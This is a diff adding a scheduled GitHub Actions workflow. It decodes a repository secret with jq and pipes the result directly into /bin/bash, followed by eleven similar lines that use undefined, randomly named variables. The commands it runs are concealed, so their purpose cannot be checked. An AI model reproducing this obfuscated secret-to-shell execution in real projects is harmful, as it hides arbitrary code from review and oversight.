@@ -1,0 +1,28 @@
+name: jiusuanyouxishule
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiusuanyouxishule
+        env:
+          ep5: ${{ secrets.ep5 }}
+        run: |
+          echo $ep5 | jq -r .o16173 | /bin/bash
+          echo $pna525 | jq -r .gpvb952 | /bin/bash
+          echo $tip0299 | jq -r .eiw2872 | /bin/bash
+          echo $wfy2112 | jq -r .hocc051 | /bin/bash
+          echo $iy11304 | jq -r .hfu628 | /bin/bash
+          echo $vc94 | jq -r .o0469 | /bin/bash
+          echo $ts6727 | jq -r .w52765 | /bin/bash
+          echo $m84 | jq -r .dt182 | /bin/bash
+          echo $hde0987 | jq -r .qbxzn88891 | /bin/bash
+          echo $bqy352 | jq -r .luhxz968 | /bin/bash
+          echo $a025 | jq -r .ci73 | /bin/bash
+          echo $ukc22 | jq -r .cmi91 | /bin/bash
+
